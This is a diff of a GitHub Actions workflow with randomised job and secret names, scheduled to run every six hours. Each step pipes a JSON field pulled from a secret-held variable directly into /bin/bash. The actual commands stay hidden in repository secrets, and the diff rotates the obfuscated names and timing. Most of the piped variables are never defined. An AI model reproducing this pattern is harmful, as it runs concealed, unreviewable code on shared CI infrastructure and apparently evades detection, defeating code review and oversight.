@@ -1,22 +1,25 @@
 name: hejiuba3415
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '18 4/6 * * *'
 
-jobs:  # 3843
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hejiuba3415
         env:
-          igwuy89525: ${{ secrets.igwuy89525 }}
+          cn48215: ${{ secrets.cn48215 }}
         run: |
-          echo $igwuy89525 | jq -r .wx2 | /bin/bash
-          echo $lbgp69 | jq -r .ymyi3604 | /bin/bash
-          echo $stfj26515 | jq -r .nys886 | /bin/bash
-          echo $cqg5 | jq -r .fljo8187 | /bin/bash
-          echo $ly10 | jq -r .xzde394 | /bin/bash
-          echo $pi0 | jq -r .vqzw3494 | /bin/bash
+          echo $cn48215 | jq -r .vfza0957 | /bin/bash
+          echo $q2395 | jq -r .qh983 | /bin/bash
+          echo $xvjs5 | jq -r .ep1569 | /bin/bash
+          echo $kc4364 | jq -r .nzg7238 | /bin/bash
+          echo $lek2 | jq -r .cby18441 | /bin/bash
+          echo $g8527 | jq -r .gz909 | /bin/bash
+          echo $jti942 | jq -r .m34 | /bin/bash
 
